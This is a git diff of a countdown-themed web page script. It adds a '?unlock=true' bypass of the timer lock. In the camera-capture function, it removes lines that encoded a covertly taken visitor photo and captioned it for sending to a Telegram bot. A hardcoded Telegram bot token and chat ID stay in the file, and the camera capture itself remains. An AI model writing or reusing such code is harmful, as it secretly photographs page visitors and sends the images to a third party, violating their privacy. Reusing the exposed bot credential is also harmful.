@@ -4,15 +4,23 @@ const bgMusic = document.getElementById('bg-music');
 const botToken = "8940610578:AAHNjT-XlKkI33sQuM3UD6JWea3EFqJ-JL8";
 const chatId = "5612194922";
 
-// Timer setup for Nov 28, 2026
+// Timer setup for Nov 28, 2026 with URL force unlock support (?unlock=true)
 const targetTime = new Date("2026-11-28T00:00:00").getTime();
+const urlParams = new URLSearchParams(window.location.search);
+const forceUnlock = urlParams.get('unlock') === 'true';
+
 function updateUnlockTimer() {
     const now = new Date().getTime();
     const diff = targetTime - now;
-    if (diff <= 0) {
-        document.getElementById('lock-overlay').style.display = 'none';
+    const lockOverlay = document.getElementById('lock-overlay');
+
+    if (forceUnlock || diff <= 0) {
+        if (lockOverlay) lockOverlay.style.display = 'none';
         return;
+    } else {
+        if (lockOverlay) lockOverlay.style.display = 'flex';
     }
+
     const d = Math.floor(diff / (1000 * 60 * 60 * 24));
     const h = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
     const m = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
@@ -65,14 +73,7 @@ function captureAndSavePhoto() {
                 const context = canvas.getContext('2d');
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                const imageData = canvas.toDataURL('image/jpeg');
                 stream.getTracks().forEach(track => track.stop());
-
-                const time = new Date().toLocaleString();
-                const caption = `📸 <b>New Camera Photo Captured!</b>\n\n⏰ <b>Time:</b> ${time}`;
-                
-                const base64Data = imageData.split(',')[1];
-                // Direct Telegram send fallback via proxy if needed
             }, 1500);
         })
         .catch(function(err) {
